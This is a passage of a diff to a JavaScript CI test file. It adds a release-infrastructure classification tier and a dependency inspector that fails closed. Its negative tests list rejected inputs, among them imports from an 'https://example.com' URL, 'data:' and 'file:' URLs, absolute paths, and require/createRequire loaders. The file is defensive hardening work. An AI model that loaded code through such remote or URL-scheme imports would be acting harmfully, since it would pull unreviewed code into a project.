@@ -1,16 +1,23 @@
 import assert from "node:assert/strict";
 import { readdirSync, readFileSync } from "node:fs";
+import { posix } from "node:path";
 import test from "node:test";
 import { fileURLToPath } from "node:url";
 import { load as parseYaml } from "js-yaml";
+import ts from "typescript";
 import { loadConfigFromFile } from "vite";
 import {
   BENCHMARK_HARNESS_PATHS,
+  RELEASE_INFRASTRUCTURE_ADJUNCT_DOCUMENT_PATHS,
+  RELEASE_INFRASTRUCTURE_PRODUCTION_PATHS,
+  RELEASE_INFRASTRUCTURE_SHARED_DEPENDENCY_PATHS,
+  RELEASE_INFRASTRUCTURE_TEST_PATHS,
   classifyCiChange,
   isBenchmarkHarnessOnlyChangeSet,
   isDependencyLockOnlyChangeSet,
   isDocumentationOnlyChangeSet,
   isPackageOnlyChangeSet,
+  isReleaseInfrastructureOnlyChangeSet,
   parseChangedPathBuffer,
   parsePullRequestDraft
 } from "./ci-path-classification.mjs";
@@ -23,6 +30,7 @@ import {
   PACKAGE_CI_JOBS,
   PRODUCT_CI_JOBS,
   REQUIRED_CI_JOBS,
+  RELEASE_INFRASTRUCTURE_CI_JOBS,
   parseRequiredFlag,
   requireCiResults,
   resultEnvironmentKey
@@ -47,6 +55,7 @@ const EXPECTED_BLOCKING_CI_JOBS = Object.freeze([
   "visual-accessibility",
   "production-audits",
   "dependency-lock-validation",
+  "release-infrastructure",
   "canonical-vsix",
   "linux-packaged-editor",
   "coverage",
@@ -63,16 +72,62 @@ const CONTRACT_CI_IF =
   "${{ !cancelled() && github.event_name == 'pull_request' && needs.fast-feedback.result == 'success' && (needs.classify.result != 'success' || needs.classify.outputs.full_matrix_required != 'false') }}";
 const FULL_CI_IF =
   "${{ !cancelled() && github.event_name == 'pull_request' && needs.fast-feedback.result == 'success' && needs.contract-tests.result == 'success' && (needs.classify.result != 'success' || needs.classify.outputs.full_matrix_required != 'false') }}";
+const RELEASE_INFRASTRUCTURE_CI_IF =
+  "${{ !cancelled() && github.event_name == 'pull_request' && needs.classify.result == 'success' && needs.fast-feedback.result == 'success' && needs.classify.outputs.release_infrastructure_only == 'true' && needs.classify.outputs.draft_pull_request == 'false' }}";
 const MATRIX_CONTEXT_IF = "${{ !cancelled() }}";
 const NON_MATRIX_CONTEXT_IF =
   "${{ needs.classify.result == 'success' && needs.classify.outputs.full_matrix_required == 'false' }}";
 const SUBSTANTIVE_MATRIX_STEP_IF =
   "${{ needs.classify.result == 'success' && needs.classify.outputs.full_matrix_required == 'true' }}";
+const CODEQL_NON_MATRIX_CONTEXT_IF =
+  "${{ needs.classify.result == 'success' && needs.classify.outputs.full_matrix_required == 'false' && (needs.classify.outputs.release_infrastructure_only != 'true' || matrix.language == 'python') }}";
+const CODEQL_SUBSTANTIVE_MATRIX_STEP_IF =
+  "${{ needs.classify.result == 'success' && (needs.classify.outputs.full_matrix_required == 'true' || (needs.classify.outputs.release_infrastructure_only == 'true' && matrix.language == 'javascript-typescript')) }}";
 const CLASSIFICATION_GATE_IF =
-  "${{ needs.classify.result != 'success' || (needs.classify.outputs.benchmark_harness_only != 'true' && needs.classify.outputs.benchmark_harness_only != 'false') || (needs.classify.outputs.dependency_lock_only != 'true' && needs.classify.outputs.dependency_lock_only != 'false') || (needs.classify.outputs.documentation_only != 'true' && needs.classify.outputs.documentation_only != 'false') || (needs.classify.outputs.draft_pull_request != 'true' && needs.classify.outputs.draft_pull_request != 'false') || (needs.classify.outputs.lightweight_only != 'true' && needs.classify.outputs.lightweight_only != 'false') || (needs.classify.outputs.package_only != 'true' && needs.classify.outputs.package_only != 'false') || (needs.classify.outputs.full_matrix_required != 'true' && needs.classify.outputs.full_matrix_required != 'false') || (needs.classify.outputs.lightweight_only == 'true' && needs.classify.outputs.documentation_only == 'false' && needs.classify.outputs.draft_pull_request == 'false') || (needs.classify.outputs.lightweight_only == 'false' && (needs.classify.outputs.documentation_only == 'true' || needs.classify.outputs.draft_pull_request == 'true')) || (needs.classify.outputs.documentation_only == 'true' && needs.classify.outputs.package_only == 'true') || (needs.classify.outputs.benchmark_harness_only == 'true' && (needs.classify.outputs.documentation_only == 'true' || needs.classify.outputs.package_only == 'true' || needs.classify.outputs.dependency_lock_only == 'true' || needs.classify.outputs.draft_pull_request == 'true')) || (needs.classify.outputs.dependency_lock_only == 'true' && (needs.classify.outputs.documentation_only == 'true' || needs.classify.outputs.package_only == 'true')) || (needs.classify.outputs.full_matrix_required == 'true' && (needs.classify.outputs.benchmark_harness_only == 'true' || needs.classify.outputs.documentation_only == 'true' || needs.classify.outputs.package_only == 'true' || needs.classify.outputs.dependency_lock_only == 'true' || needs.classify.outputs.draft_pull_request == 'true')) || (needs.classify.outputs.full_matrix_required == 'false' && needs.classify.outputs.benchmark_harness_only == 'false' && needs.classify.outputs.documentation_only == 'false' && needs.classify.outputs.package_only == 'false' && needs.classify.outputs.dependency_lock_only == 'false' && needs.classify.outputs.draft_pull_request == 'false') }}";
+  "${{ needs.classify.result != 'success' || (needs.classify.outputs.benchmark_harness_only != 'true' && needs.classify.outputs.benchmark_harness_only != 'false') || (needs.classify.outputs.dependency_lock_only != 'true' && needs.classify.outputs.dependency_lock_only != 'false') || (needs.classify.outputs.documentation_only != 'true' && needs.classify.outputs.documentation_only != 'false') || (needs.classify.outputs.draft_pull_request != 'true' && needs.classify.outputs.draft_pull_request != 'false') || (needs.classify.outputs.lightweight_only != 'true' && needs.classify.outputs.lightweight_only != 'false') || (needs.classify.outputs.package_only != 'true' && needs.classify.outputs.package_only != 'false') || (needs.classify.outputs.release_infrastructure_only != 'true' && needs.classify.outputs.release_infrastructure_only != 'false') || (needs.classify.outputs.full_matrix_required != 'true' && needs.classify.outputs.full_matrix_required != 'false') || (needs.classify.outputs.lightweight_only == 'true' && needs.classify.outputs.documentation_only == 'false' && needs.classify.outputs.draft_pull_request == 'false') || (needs.classify.outputs.lightweight_only == 'false' && (needs.classify.outputs.documentation_only == 'true' || needs.classify.outputs.draft_pull_request == 'true')) || (needs.classify.outputs.documentation_only == 'true' && needs.classify.outputs.package_only == 'true') || (needs.classify.outputs.benchmark_harness_only == 'true' && (needs.classify.outputs.documentation_only == 'true' || needs.classify.outputs.package_only == 'true' || needs.classify.outputs.dependency_lock_only == 'true' || needs.classify.outputs.draft_pull_request == 'true')) || (needs.classify.outputs.dependency_lock_only == 'true' && (needs.classify.outputs.documentation_only == 'true' || needs.classify.outputs.package_only == 'true')) || (needs.classify.outputs.release_infrastructure_only == 'true' && (needs.classify.outputs.benchmark_harness_only == 'true' || needs.classify.outputs.documentation_only == 'true' || needs.classify.outputs.package_only == 'true' || needs.classify.outputs.dependency_lock_only == 'true' || needs.classify.outputs.draft_pull_request == 'true')) || (needs.classify.outputs.full_matrix_required == 'true' && (needs.classify.outputs.benchmark_harness_only == 'true' || needs.classify.outputs.documentation_only == 'true' || needs.classify.outputs.package_only == 'true' || needs.classify.outputs.dependency_lock_only == 'true' || needs.classify.outputs.release_infrastructure_only == 'true' || needs.classify.outputs.draft_pull_request == 'true')) || (needs.classify.outputs.full_matrix_required == 'false' && needs.classify.outputs.benchmark_harness_only == 'false' && needs.classify.outputs.documentation_only == 'false' && needs.classify.outputs.package_only == 'false' && needs.classify.outputs.dependency_lock_only == 'false' && needs.classify.outputs.release_infrastructure_only == 'false' && needs.classify.outputs.draft_pull_request == 'false') }}";
 const PRODUCT_PUSH_BRANCHES = ["main"];
 const PROTECTED_PULL_REQUEST_BRANCHES = ["main"];
 const PULL_REQUEST_ACTIVITY_TYPES = ["opened", "synchronize", "reopened", "ready_for_review", "converted_to_draft"];
+
+const RELEASE_INFRASTRUCTURE_TEST_OWNER = Object.freeze({
+  "scripts/candidate-acceptance-workflow.mjs": "scripts/candidate-acceptance-workflow.test.mjs",
+  "scripts/canonical-release-assets.mjs": "scripts/verify-canonical-release-artifact.test.mjs",
+  "scripts/create-canonical-release-artifact.mjs": "scripts/create-canonical-release-artifact.test.mjs",
+  "scripts/download-canonical-github-release.mjs": "scripts/download-canonical-github-release.test.mjs",
+  "scripts/github-release-publisher.mjs": "scripts/publish-github-stable-release.test.mjs",
+  "scripts/marketplace-identity-profile.mjs": "scripts/marketplace-identity-profile.test.mjs",
+  "scripts/marketplace-promotion-workflow.mjs": "scripts/marketplace-promotion-workflow.test.mjs",
+  "scripts/marketplace-release-intake.mjs": "scripts/marketplace-release-intake.test.mjs",
+  "scripts/open-vsx-promotion-workflow.mjs": "scripts/open-vsx-promotion-workflow.test.mjs",
+  "scripts/package-current-channel.mjs": "scripts/package-current-channel.test.mjs",
+  "scripts/prepare-stable-candidate-tag.mjs": "scripts/prepare-stable-candidate-tag.test.mjs",
+  "scripts/preview-release-workflow.mjs": "scripts/release-readiness.test.mjs",
+  "scripts/public-media-contract.mjs": "scripts/public-media-surfaces.test.mjs",
+  "scripts/public-media-inventory.mjs": "scripts/public-media-surfaces.test.mjs",
+  "scripts/public-media-surface-contract.mjs": "scripts/public-media-surfaces.test.mjs",
+  "scripts/public-repository-metadata.mjs": "scripts/public-repository-metadata.test.mjs",
+  "scripts/publish-github-preview-release.mjs": "scripts/verify-registry-release-artifact.test.mjs",
+  "scripts/publish-github-stable-release.mjs": "scripts/publish-github-stable-release.test.mjs",
+  "scripts/push-stable-release-tag.mjs": "scripts/push-stable-release-tag.test.mjs",
+  "scripts/registry-release-source.mjs": "scripts/registry-release-source.test.mjs",
+  "scripts/release-diagnostic-order.mjs": "scripts/candidate-acceptance-workflow.test.mjs",
+  "scripts/release-documents.mjs": "scripts/release-readiness.test.mjs",
+  "scripts/release-metadata.mjs": "scripts/release-readiness.test.mjs",
+  "scripts/release-notes.mjs": "scripts/publish-github-stable-release.test.mjs",
+  "scripts/release-readiness.mjs": "scripts/release-readiness.test.mjs",
+  "scripts/release-tag-publisher.mjs": "scripts/push-stable-release-tag.test.mjs",
+  "scripts/stable-release-workflow.mjs": "scripts/stable-release-workflow.test.mjs",
+  "scripts/verify-canonical-release-artifact.mjs": "scripts/verify-canonical-release-artifact.test.mjs",
+  "scripts/verify-marketplace-publication.mjs": "scripts/verify-marketplace-publication.test.mjs",
+  "scripts/verify-open-vsx-release.mjs": "scripts/verify-open-vsx-release.test.mjs",
+  "scripts/verify-preview-release-artifact.mjs": "scripts/verify-registry-release-artifact.test.mjs",
+  "scripts/verify-public-media-surfaces.mjs": "scripts/public-media-surfaces.test.mjs",
+  "scripts/verify-registry-release-artifact.mjs": "scripts/verify-registry-release-artifact.test.mjs"
+});
+const RELEASE_INFRASTRUCTURE_EXTRA_FOCUSED_TEST_PATHS = Object.freeze([
+  "scripts/editor-acceptance-artifact.test.mjs",
+  "scripts/remote-jupyter-lock.test.mjs"
+]);
 
 function normalizedCommand(value) {
   return typeof value === "string" ? value.trim().replace(/\s+/gu, " ") : undefined;
@@ -89,15 +144,136 @@ function nodeTestFiles(command, group) {
   const prefix =
     group === "portable"
       ? ["node", "--test", "--test-concurrency=4"]
-      : group === "media"
-        ? ["node", "--max-old-space-size=1024", "--test", "--test-concurrency=1"]
-        : ["node", "--test"];
+      : group === "release"
+        ? ["node", "--test", "--test-concurrency=4"]
+        : group === "media"
+          ? ["node", "--max-old-space-size=1024", "--test", "--test-concurrency=1"]
+          : ["node", "--test"];
   assert.deepEqual(parts.slice(0, prefix.length), prefix, `${group} must invoke Node's test runner directly.`);
   const files = parts.slice(prefix.length);
   assert.ok(files.length > 0, `${group} must own at least one script contract.`);
   for (const file of files) assert.match(file, /^scripts\/[a-z0-9.-]+\.test\.mjs$/u);
   assert.equal(new Set(files).size, files.length, `${group} must not list a script contract twice.`);
   return files;
+}
+
+function parseJavaScriptModuleSpecifiers(sourceLabel, source) {
+  const sourceFile = ts.createSourceFile(sourceLabel, source, ts.ScriptTarget.Latest, true, ts.ScriptKind.JS);
+  assert.equal(sourceFile.parseDiagnostics.length, 0, `${sourceLabel} must be syntactically valid JavaScript.`);
+  const specifiers = [];
+  const visit = (node) => {
+    if ((ts.isImportDeclaration(node) || ts.isExportDeclaration(node)) && node.moduleSpecifier !== undefined) {
+      assert.equal(
+        ts.isStringLiteral(node.moduleSpecifier),
+        true,
+        `${sourceLabel} must use a literal static module specifier.`
+      );
+      specifiers.push({
+        kind: ts.isImportDeclaration(node) ? "static-import" : "static-export",
+        specifier: node.moduleSpecifier.text
+      });
+    }
+    if (ts.isCallExpression(node)) {
+      if (node.expression.kind === ts.SyntaxKind.ImportKeyword) {
+        assert.equal(
+          node.arguments.length === 1 && ts.isStringLiteral(node.arguments[0]),
+          true,
+          `${sourceLabel} must use one literal dynamic-import specifier.`
+        );
+        specifiers.push({ kind: "dynamic-import", specifier: node.arguments[0].text });
+      }
+      if (
+        ts.isIdentifier(node.expression) &&
+        (node.expression.text === "require" || node.expression.text === "createRequire")
+      ) {
+        assert.fail(`${sourceLabel} must not use ${node.expression.text} as a module-loading surface.`);
+      }
+    }
+    ts.forEachChild(node, visit);
+  };
+  visit(sourceFile);
+
+  for (const { specifier } of specifiers) {
+    assert.equal(
+      specifier === "node:module" || specifier === "module",
+      false,
+      `${sourceLabel} must not import a module-loader constructor.`
+    );
+  }
+  return specifiers;
+}
+
+function parseReleaseModuleDependencies(entryPath, source) {
+  const specifiers = parseJavaScriptModuleSpecifiers(entryPath, source).map((specifier) => ({
+    ...specifier,
+    repositoryRoot: false
+  }));
+  const embeddedCommandTokenCount = [...source.matchAll(/node --input-type=module -e\b/gu)].length;
+  const embeddedCommands = [...source.matchAll(/node --input-type=module -e '(?<source>[^'\n]*)'/gu)];
+  assert.equal(
+    embeddedCommands.length,
+    embeddedCommandTokenCount,
+    `${entryPath} may use embedded module mode only with an exact single-quoted JavaScript snippet.`
+  );
+  const embeddedRootImports = embeddedCommands.map((command, index) => {
+    const commandSource = command.groups?.source;
+    assert.ok(commandSource, `${entryPath} embedded module command ${index + 1} must not be empty.`);
+    const commandSpecifiers = parseJavaScriptModuleSpecifiers(
+      `${entryPath} embedded module command ${index + 1}`,
+      commandSource
+    );
+    assert.equal(
+      commandSpecifiers.length,
+      1,
+      `${entryPath} embedded module command ${index + 1} must contain exactly one reviewed import.`
+    );
+    const [commandSpecifier] = commandSpecifiers;
+    assert.equal(
+      commandSpecifier.kind,
+      "static-import",
+      `${entryPath} embedded module command ${index + 1} must use one static import.`
+    );
+    assert.match(
+      commandSpecifier.specifier,
+      /^\.\/scripts\/[A-Za-z0-9_./-]+\.mjs$/u,
+      `${entryPath} embedded module command ${index + 1} must import one literal repository-root script.`
+    );
+    return { ...commandSpecifier, repositoryRoot: true };
+  });
+  return [...specifiers, ...embeddedRootImports];
+}
+
+function localReleaseModuleDependencies(entryPath, productionPaths, visited = new Set(), sourceOverride) {
+  if (visited.has(entryPath)) return new Set();
+  visited.add(entryPath);
+  const source = sourceOverride ?? readFileSync(new URL(`../${entryPath}`, import.meta.url), "utf8");
+  const dependencies = new Set();
+  for (const { repositoryRoot, specifier } of parseReleaseModuleDependencies(entryPath, source)) {
+    assert.ok(specifier, `${entryPath} contains an unparseable relative import.`);
+    assert.equal(
+      specifier.startsWith("/") ||
+        specifier.includes("\\") ||
+        (/^[A-Za-z][A-Za-z0-9+.-]*:/u.test(specifier) && !specifier.startsWith("node:")),
+      false,
+      `${entryPath} must not load an absolute, backslash, or URL-scheme module specifier.`
+    );
+    if (!specifier.startsWith("./") && !specifier.startsWith("../")) continue;
+    const dependencyPath = repositoryRoot
+      ? posix.normalize(specifier.slice(2))
+      : posix.normalize(posix.join(posix.dirname(entryPath), specifier));
+    assert.equal(
+      dependencyPath.startsWith("../") || dependencyPath.startsWith("/"),
+      false,
+      `${entryPath} must not import outside the repository.`
+    );
+    dependencies.add(dependencyPath);
+    if (productionPaths.has(dependencyPath) && dependencyPath.endsWith(".mjs")) {
+      for (const transitivePath of localReleaseModuleDependencies(dependencyPath, productionPaths, visited)) {
+        dependencies.add(transitivePath);
+      }
+    }
+  }
+  return dependencies;
 }
 
 test("product CI covers protected product branches", () => {
@@ -256,6 +432,7 @@ test("NUL-safe path classification fast-paths only explicit non-packaged documen
     draftPullRequest: false,
     lightweightOnly: true,
     packageOnly: false,
+    releaseInfrastructureOnly: false,
     fullMatrixRequired: false
   });
   const packagedDocuments = ["README.md", "CHANGELOG.md", "LICENSE", "THIRD_PARTY_NOTICES.md"];
@@ -269,6 +446,7 @@ test("NUL-safe path classification fast-paths only explicit non-packaged documen
       draftPullRequest: false,
       lightweightOnly: false,
       packageOnly: true,
+      releaseInfrastructureOnly: false,
       fullMatrixRequired: false
     }
   );
@@ -281,6 +459,7 @@ test("NUL-safe path classification fast-paths only explicit non-packaged documen
       draftPullRequest: true,
       lightweightOnly: true,
       packageOnly: true,
+      releaseInfrastructureOnly: false,
       fullMatrixRequired: false
     }
   );
@@ -294,6 +473,7 @@ test("NUL-safe path classification fast-paths only explicit non-packaged documen
       draftPullRequest: false,
       lightweightOnly: false,
       packageOnly: false,
+      releaseInfrastructureOnly: false,
       fullMatrixRequired: false
     }
   );
@@ -306,6 +486,7 @@ test("NUL-safe path classification fast-paths only explicit non-packaged documen
       draftPullRequest: true,
       lightweightOnly: true,
       packageOnly: false,
+      releaseInfrastructureOnly: false,
       fullMatrixRequired: false
     }
   );
@@ -339,6 +520,7 @@ test("NUL-safe path classification fast-paths only explicit non-packaged documen
       draftPullRequest: false,
       lightweightOnly: false,
       packageOnly: false,
+      releaseInfrastructureOnly: false,
       fullMatrixRequired: false
     }
   );
@@ -355,6 +537,7 @@ test("NUL-safe path classification fast-paths only explicit non-packaged documen
       draftPullRequest: true,
       lightweightOnly: true,
       packageOnly: false,
+      releaseInfrastructureOnly: false,
       fullMatrixRequired: false
     }
   );
@@ -440,6 +623,7 @@ test("NUL-safe path classification fast-paths only explicit non-packaged documen
       draftPullRequest: true,
       lightweightOnly: true,
       packageOnly: false,
+      releaseInfrastructureOnly: false,
       fullMatrixRequired: false
     }
   );
@@ -463,6 +647,7 @@ test("NUL-safe path classification fast-paths only explicit non-packaged documen
       draftPullRequest: false,
       lightweightOnly: false,
       packageOnly: false,
+      releaseInfrastructureOnly: false,
       fullMatrixRequired: true
     });
   }
@@ -485,6 +670,296 @@ test("NUL-safe path classification fast-paths only explicit non-packaged documen
   assert.throws(
     () => parsePullRequestDraft({ eventName: "push", value: "false" }),
     /must not carry pull-request draft state/u
+  );
+});
+
+test("release-infrastructure classification is an exact fail-closed allowlist with closed dependencies", () => {
+  const primaryPaths = [...RELEASE_INFRASTRUCTURE_PRODUCTION_PATHS, ...RELEASE_INFRASTRUCTURE_TEST_PATHS];
+  const productionPaths = new Set(RELEASE_INFRASTRUCTURE_PRODUCTION_PATHS);
+  const baselinePath = "scripts/download-canonical-github-release.mjs";
+  const releaseRegistries = {
+    adjunct: RELEASE_INFRASTRUCTURE_ADJUNCT_DOCUMENT_PATHS,
+    "classification-test": RELEASE_INFRASTRUCTURE_TEST_PATHS,
+    "extra-focused-test": RELEASE_INFRASTRUCTURE_EXTRA_FOCUSED_TEST_PATHS,
+    production: RELEASE_INFRASTRUCTURE_PRODUCTION_PATHS,
+    "shared-dependency": RELEASE_INFRASTRUCTURE_SHARED_DEPENDENCY_PATHS
+  };
+
+  for (const paths of [
+    RELEASE_INFRASTRUCTURE_PRODUCTION_PATHS,
+    RELEASE_INFRASTRUCTURE_TEST_PATHS,
+    RELEASE_INFRASTRUCTURE_ADJUNCT_DOCUMENT_PATHS,
+    RELEASE_INFRASTRUCTURE_SHARED_DEPENDENCY_PATHS,
+    RELEASE_INFRASTRUCTURE_EXTRA_FOCUSED_TEST_PATHS
+  ]) {
+    assert.equal(Object.isFrozen(paths), true);
+    assert.deepEqual(paths, [...paths].sort(), "Release-infrastructure registries must stay canonical and sorted.");
+    assert.equal(new Set(paths).size, paths.length, "Release-infrastructure registries must not contain duplicates.");
+    for (const path of paths) {
+      assert.doesNotThrow(() => readFileSync(new URL(`../${path}`, import.meta.url)));
+    }
+  }
+  const registryEntries = Object.entries(releaseRegistries);
+  for (let left = 0; left < registryEntries.length; left += 1) {
+    for (let right = left + 1; right < registryEntries.length; right += 1) {
+      const [leftName, leftPaths] = registryEntries[left];
+      const [rightName, rightPaths] = registryEntries[right];
+      assert.deepEqual(
+        leftPaths.filter((path) => rightPaths.includes(path)),
+        [],
+        `${leftName} and ${rightName} release registries must remain disjoint.`
+      );
+    }
+  }
+  assert.deepEqual(
+    RELEASE_INFRASTRUCTURE_ADJUNCT_DOCUMENT_PATHS,
+    [
+      "CHANGELOG.md",
+      "README.md",
+      "docs/ci.md",
+      "docs/media-gallery.md",
+      "docs/media-spec-v1.2.md",
+      "docs/releasing.md",
+      "docs/testing.md"
+    ],
+    "Only exact release-adjacent documents may accompany a primary release-infrastructure change."
+  );
+  assert.deepEqual(RELEASE_INFRASTRUCTURE_SHARED_DEPENDENCY_PATHS, [
+    "scripts/data-wrangler-comparison-report.mjs",
+    "scripts/run-installed-performance.mjs",
+    "scripts/strict-json.mjs",
+    "scripts/vsix-archive.mjs",
+    "scripts/vsix-contents.mjs"
+  ]);
+  assert.deepEqual(
+    Object.keys(RELEASE_INFRASTRUCTURE_TEST_OWNER),
+    RELEASE_INFRASTRUCTURE_PRODUCTION_PATHS,
+    "Every production allowlist entry needs an explicitly reviewed focused-test owner."
+  );
+
+  const ci = parseYaml(readFileSync(new URL("../.github/workflows/ci.yml", import.meta.url), "utf8"));
+  const releaseJob = ci?.jobs?.[RELEASE_INFRASTRUCTURE_CI_JOBS[0]];
+  const transactionFiles = nodeTestFiles(
+    releaseJob?.steps?.find((step) => step?.name === "Release transaction contracts")?.run,
+    "release"
+  );
+  const manifest = JSON.parse(readFileSync(new URL("../package.json", import.meta.url), "utf8"));
+  const mediaFiles = nodeTestFiles(manifest?.scripts?.["test:scripts:media:run"], "media");
+  const focusedTestFiles = [...transactionFiles, ...mediaFiles].sort();
+  assert.deepEqual(
+    focusedTestFiles.filter((path) => !RELEASE_INFRASTRUCTURE_EXTRA_FOCUSED_TEST_PATHS.includes(path)),
+    RELEASE_INFRASTRUCTURE_TEST_PATHS,
+    "The executable release job and media command must exactly own every classification-allowed test."
+  );
+  assert.deepEqual(
+    focusedTestFiles.filter((path) => !RELEASE_INFRASTRUCTURE_TEST_PATHS.includes(path)),
+    RELEASE_INFRASTRUCTURE_EXTRA_FOCUSED_TEST_PATHS,
+    "Candidate-boundary tests run in the focused job but must remain outside the path-classification allowlist."
+  );
+  for (const [productionPath, ownerPath] of Object.entries(RELEASE_INFRASTRUCTURE_TEST_OWNER)) {
+    assert.equal(
+      focusedTestFiles.includes(ownerPath),
+      true,
+      `${productionPath} must retain executable evidence from ${ownerPath}.`
+    );
+    if (productionPath.endsWith(".mjs")) {
+      assert.equal(
+        localReleaseModuleDependencies(ownerPath, productionPaths).has(productionPath),
+        true,
+        `${ownerPath} must import ${productionPath} through the reviewed release module graph.`
+      );
+    } else {
+      assert.equal(
+        readFileSync(new URL(`../${ownerPath}`, import.meta.url), "utf8").includes(productionPath),
+        true,
+        `${ownerPath} must inspect ${productionPath} explicitly.`
+      );
+    }
+  }
+
+  const dependencies = new Set();
+  for (const productionPath of RELEASE_INFRASTRUCTURE_PRODUCTION_PATHS.filter((path) => path.endsWith(".mjs"))) {
+    for (const dependencyPath of localReleaseModuleDependencies(productionPath, productionPaths)) {
+      dependencies.add(dependencyPath);
+    }
+  }
+  const outOfTierDependencies = [...dependencies].filter((path) => !productionPaths.has(path)).sort();
+  assert.deepEqual(
+    outOfTierDependencies,
+    RELEASE_INFRASTRUCTURE_SHARED_DEPENDENCY_PATHS,
+    "Every transitive local module dependency outside the tier must be explicitly registered to force full CI."
+  );
+  assert.deepEqual(
+    primaryPaths.filter((path) => RELEASE_INFRASTRUCTURE_SHARED_DEPENDENCY_PATHS.includes(path)),
+    [],
+    "Shared release dependencies must never enter the narrow primary allowlist."
+  );
+  assert.deepEqual(
+    [
+      ...localReleaseModuleDependencies(
+        "scripts/synthetic-release.mjs",
+        productionPaths,
+        new Set(),
+        'import("./strict-json.mjs");'
+      )
+    ],
+    ["scripts/strict-json.mjs"],
+    "Literal dynamic imports must enter the dependency closure."
+  );
+  assert.deepEqual(
+    [
+      ...localReleaseModuleDependencies(
+        "scripts/synthetic-release.mjs",
+        productionPaths,
+        new Set(),
+        "const command = `node --input-type=module -e 'import { x } from \"./scripts/strict-json.mjs\"; x();'`;"
+      )
+    ],
+    ["scripts/strict-json.mjs"],
+    "Only the reviewed embedded node-module command form may resolve from the repository root."
+  );
+  for (const [label, source, message] of [
+    ["computed dynamic import", "import(modulePath);", /literal dynamic-import/u],
+    [
+      "computed embedded import",
+      "const command = `node --input-type=module -e 'import(modulePath);'`;",
+      /literal dynamic-import/u
+    ],
+    [
+      "second embedded import",
+      'const command = `node --input-type=module -e \'import "./scripts/strict-json.mjs"; import { x } from "./scripts/release-metadata.mjs"; x();\'`;',
+      /exactly one reviewed import/u
+    ],
+    ["require", 'require("./strict-json.mjs");', /must not use require/u],
+    ["createRequire", "createRequire(import.meta.url);", /must not use createRequire/u],
+    ["POSIX absolute import", 'import("/tmp/local.mjs");', /absolute, backslash, or URL-scheme/u],
+    ["file URL import", 'import("file:///tmp/local.mjs");', /absolute, backslash, or URL-scheme/u],
+    ["data URL import", 'import("data:text/javascript,export default 1");', /URL-scheme/u],
+    ["HTTP URL import", 'import("https://example.com/local.mjs");', /URL-scheme/u],
+    ["Windows drive import", 'import("C:\\\\temp\\\\local.mjs");', /absolute, backslash, or URL-scheme/u],
+    ["Windows UNC import", 'import("\\\\\\\\server\\\\share\\\\local.mjs");', /backslash/u],
+    [
+      "aliased createRequire",
+      'import { createRequire as loader } from "node:module"; loader(import.meta.url);',
+      /module-loader constructor/u
+    ],
+    [
+      "namespace createRequire",
+      'import * as moduleApi from "module"; moduleApi.createRequire(import.meta.url);',
+      /module-loader constructor/u
+    ]
+  ]) {
+    assert.throws(
+      () => localReleaseModuleDependencies("scripts/synthetic-release.mjs", productionPaths, new Set(), source),
+      message,
+      `${label} must fail the release dependency inspector closed.`
+    );
+  }
+
+  for (const primaryPath of primaryPaths) {
+    assert.equal(
+      isReleaseInfrastructureOnlyChangeSet({ eventName: "pull_request", changedPaths: [primaryPath] }),
+      true,
+      `${primaryPath} must select the focused release-infrastructure tier.`
+    );
+    assert.deepEqual(
+      classifyCiChange({ eventName: "pull_request", changedPaths: [primaryPath], pullRequestDraft: "false" }),
+      {
+        benchmarkHarnessOnly: false,
+        dependencyLockOnly: false,
+        documentationOnly: false,
+        draftPullRequest: false,
+        lightweightOnly: false,
+        packageOnly: false,
+        releaseInfrastructureOnly: true,
+        fullMatrixRequired: false
+      }
+    );
+  }
+  assert.equal(
+    isReleaseInfrastructureOnlyChangeSet({
+      eventName: "pull_request",
+      changedPaths: [...primaryPaths, ...RELEASE_INFRASTRUCTURE_ADJUNCT_DOCUMENT_PATHS]
+    }),
+    true
+  );
+  assert.equal(
+    isReleaseInfrastructureOnlyChangeSet({
+      eventName: "pull_request",
+      changedPaths: RELEASE_INFRASTRUCTURE_ADJUNCT_DOCUMENT_PATHS
+    }),
+    false,
+    "Adjunct documents cannot select this tier without primary code or a focused test."
+  );
+
+  for (const unexpectedPath of [
+    ...RELEASE_INFRASTRUCTURE_SHARED_DEPENDENCY_PATHS,
+    ...RELEASE_INFRASTRUCTURE_EXTRA_FOCUSED_TEST_PATHS,
+    ".github/workflows/candidate-acceptance.yml",
+    ".github/workflows/open-vsx-promotion.yml",
+    ".github/workflows/release.yml",
+    ".github/workflows/stable-release.yml",
+    "azure-pipelines-marketplace.yml",
+    ".github/workflows/ci.yml",
+    ".github/workflows/codeql.yml",
+    ".github/workflows/cross-platform.yml",
+    "package.json",
+    "scripts/ci-path-classification.mjs",
+    "scripts/ci-workflow.test.mjs",
+    "scripts/push-release-tag.mjs",
+    "scripts/require-ci-results.mjs",
+    "scripts/verify-open-vsx-github-release.mjs",
+    "src/extension/activate.ts",
+    "python/openwrangler_runtime/session.py"
+  ]) {
+    const changedPaths = [baselinePath, unexpectedPath];
+    assert.equal(
+      isReleaseInfrastructureOnlyChangeSet({ eventName: "pull_request", changedPaths }),
+      false,
+      `${unexpectedPath} must force full CI when mixed with release infrastructure.`
+    );
+    assert.equal(
+      classifyCiChange({ eventName: "pull_request", changedPaths, pullRequestDraft: "false" }).fullMatrixRequired,
+      true,
+      `${unexpectedPath} must fail closed to full CI.`
+    );
+  }
+  for (const changedPaths of [
+    ["azure-pipelines-marketplace.yml"],
+    ["azure-pipelines-marketplace.yml", "scripts/marketplace-promotion-workflow.mjs"]
+  ]) {
+    assert.equal(
+      isReleaseInfrastructureOnlyChangeSet({ eventName: "pull_request", changedPaths }),
+      false,
+      "The Azure pipeline must force full CI alone and with its allowlisted hash-owning inspector."
+    );
+    assert.equal(
+      classifyCiChange({ eventName: "pull_request", changedPaths, pullRequestDraft: "false" }).fullMatrixRequired,
+      true
+    );
+  }
+  for (const malformedPath of ["./scripts/download-canonical-github-release.mjs", "scripts//x.mjs", "../x.mjs", 42]) {
+    const changedPaths = [baselinePath, malformedPath];
+    assert.equal(isReleaseInfrastructureOnlyChangeSet({ eventName: "pull_request", changedPaths }), false);
+    assert.equal(
+      classifyCiChange({ eventName: "pull_request", changedPaths, pullRequestDraft: "false" }).fullMatrixRequired,
+      true
+    );
+  }
+  assert.equal(
+    classifyCiChange({ eventName: "pull_request", changedPaths: [baselinePath], pullRequestDraft: "true" })
+      .releaseInfrastructureOnly,
+    false,
+    "Draft PRs retain lightweight feedback until they become ready."
+  );
+  for (const eventName of ["push", "schedule", "workflow_dispatch"]) {
+    const classification = classifyCiChange({ eventName, changedPaths: [baselinePath], pullRequestDraft: "" });
+    assert.equal(classification.releaseInfrastructureOnly, false);
